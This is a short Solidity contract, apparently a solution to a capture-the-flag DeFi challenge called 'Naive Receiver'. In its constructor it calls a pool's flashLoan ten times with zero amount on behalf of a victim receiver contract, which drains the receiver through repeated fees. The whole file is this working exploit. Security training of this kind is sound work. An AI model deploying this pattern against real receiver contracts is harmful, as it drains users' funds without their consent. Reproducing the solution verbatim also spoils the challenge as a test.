// SPDX-LICENSE-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

contract PlayerNaiveReceiver {

    constructor(address payable _pool, address _receiver){
        IPool pool = IPool(_pool);
        address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

        for(uint i = 0; i < 10; i++) {
            pool.flashLoan(_receiver, ETH, 0, "0x");
        }
    }
}